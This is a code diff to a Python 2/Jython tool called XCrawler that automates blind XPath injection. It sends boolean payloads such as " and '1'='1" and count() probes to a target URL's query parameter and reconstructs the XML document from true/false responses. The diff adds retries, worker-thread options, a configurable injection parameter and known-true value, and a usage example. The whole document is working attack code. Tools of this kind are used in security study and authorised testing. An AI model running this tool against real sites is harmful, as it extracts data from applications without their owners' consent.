@@ -7,6 +7,8 @@ from xml.dom.minidom import *
 
 
 class XCrawler(object):
+    MAX_RETRY = 4
+
     strTrue = " and '1'='1"
     strFalse = " and '1'='0"
     strCount = "' and count({})={}"
@@ -19,6 +21,10 @@ class XCrawler(object):
         args = self.set_args()
         self.url = args.url
         self.xml = Document()
+        self.mutex = None
+        self.nb_thread = int(args.nbt)
+        self.query = args.query
+        self.sure_value = args.v
 
     def count_node(self, path):
         count = 0
@@ -49,14 +55,36 @@ class XCrawler(object):
         return name
 
     def get_request(self, payload):
-        response = urllib2.urlopen(self.url + "?" + payload)
-        html = response.read()
+        retry = 0
+        html = ""
+        while retry < self.MAX_RETRY:
+            try:
+                response = urllib2.urlopen(self.url + "?" + payload)
+                html = response.read()
+                retry = self.MAX_RETRY
+            except Exception, e:
+                retry += 1
+                print "Retry #{}\n".format(retry)
+                print e
         return self.strConfirm in html
 
     def make_payload(self, step):
-        return urllib.urlencode({"query": "0" + step + self.strTrue})
+        return urllib.urlencode({self.query: self.sure_value + step + self.strTrue})
 
     def set_args(self):
         parser = argparse.ArgumentParser()
         parser.add_argument('-url')
+        parser.add_argument('-nbt')
+        parser.add_argument('-query')
+        parser.add_argument('-v')
         return parser.parse_args()
+
+
+def usage(version):
+    print "USAGE: jython {}.py -url \"URL\" -query \"query\" -v \"sure value\" -nbt X".format(version)
+    print "\t-url: The host's url"
+    print "\t-query: The query used for the injection"
+    print "\t-v: A sure value that will return true"
+    print "\t-nbt: Number of Workers to work with (not necessary for xcrawler_seq)"
+    print "Example: jython {}.py -url \"http://localhost:8080/index.php\" -query \"query\" -v \"admin\" -nbt 4"\
+        .format(version)
